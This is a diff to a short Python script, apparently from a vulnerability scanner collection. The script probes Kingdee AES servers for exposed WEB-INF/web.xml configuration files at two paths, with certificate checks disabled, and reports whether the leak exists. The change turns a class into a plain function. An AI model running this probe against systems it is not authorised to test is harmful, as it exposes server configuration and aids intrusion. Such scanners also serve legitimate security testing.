@@ -9,20 +9,13 @@ description: 文件/WEB-INF/web.xml泄露。
 import sys
 import requests
 import warnings
-
-
-
-class conf_disclosure:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['金蝶AES系统Java web配置文件泄露','','']
         headers = {
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
         }
         payload = "/portal/WEB-INF/web.xml"
-        vulnurl = self.url + payload
+        vulnurl = url + payload
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if req.headers["Content-Type"] == "application/xml":
@@ -31,7 +24,7 @@ class conf_disclosure:
             else:
                 result[2]=  '不存在'
 
-            vulnurl = self.url + "/eassso/WEB-INF/web.xml"
+            vulnurl = url + "/eassso/WEB-INF/web.xml"
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if req.headers["Content-Type"] == "application/xml":
                 result[2]=  '存在'
@@ -45,5 +38,5 @@ class conf_disclosure:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = conf_disclosure(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
+    
